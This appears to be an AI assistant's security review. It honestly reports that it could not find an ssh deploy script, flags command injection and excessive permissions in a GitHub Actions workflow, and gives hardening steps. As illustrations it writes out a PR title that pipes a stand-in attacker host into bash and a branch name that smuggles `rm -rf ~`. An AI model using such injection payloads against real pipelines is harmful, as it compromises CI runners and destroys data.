I couldn't find the deploy script, so I haven't reviewed it yet. Nothing in this workspace contains `ssh` or `branch` (I searched for both, case-insensitive on `BRANCH`). The only shell script is `scripts/backup.sh`, and the CI files (`.github/workflows/deploy.yml`, `Jenkinsfile`, `.gitlab-ci.yml`) don't build an ssh command. It may be on another branch, not committed yet, or in another repo. Can you paste it or give me the path?

## Two problems in `.github/workflows/deploy.yml`

I did find two serious problems in the workflow that would run it:

- **Line 14 lets anyone opening a PR run commands on the runner.** `echo "Title is ${{ github.event.pull_request.title }}"` pastes the PR title into the script before the shell reads it. A title like `"; curl attacker.sh | bash; "` would run on the runner. Fix: pass the title through an environment variable:
  ```yaml
  - env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: printf 'Title is %s\n' "$PR_TITLE"
  ```
- **Line 7 gives that job far too much access.** `permissions: write-all` on a `pull_request` trigger hands a write-scoped token to the job described above. Narrow it to `permissions: contents: read` and add only what the deploy actually needs.

## What I'll check in the ssh script

Building the ssh command with the branch name inside a string is the main risk. ssh joins its remote arguments into one string, and the remote shell parses that string again. So quoting the branch name locally doesn't protect the remote side. A branch name is also attacker-controlled: anyone who can push can name a branch `x;rm -rf ~`, and git allows `$`, `` ` ``, `;` and `|` in branch names. The fix has three parts:

1. **Validate the branch name against an allowlist first,** and reject anything that doesn't match rather than trying to clean it up:
   ```bash
   if [[ ! ${branch} =~ ^[A-Za-z0-9._/-]+$ || ${branch} == -* || ${branch} == *..* ]]; then
     printf 'invalid branch: %q\n' "${branch}" >&2; exit 2
   fi
   ```
2. **Keep shell parsing out of the remote command.** Run a fixed script on the remote host and send the branch name as data on stdin:
   ```bash
   printf '%s\n' "${branch}" | ssh -- "${host}" /opt/deploy/deploy.sh
   ```
   `deploy.sh` reads the name with `IFS= read -r branch`, validates it again, and uses it only as `"${branch}"`. If the command has to be built locally, use `printf -v remote 'deploy.sh %q' "${branch}"`. That's weaker: it assumes the remote login shell is Bash.
3. **Apply the baseline:** `set -Eeuo pipefail`, every expansion quoted, no `eval` or `bash -c "$string"`, the ssh key passed as a file and not as an argument or env var, no `set -x` near secrets, and `StrictHostKeyChecking=yes` with a pinned `known_hosts`.

Once I have the script, I'll go through it against these points and run `shellcheck` and `bash -n` on it.
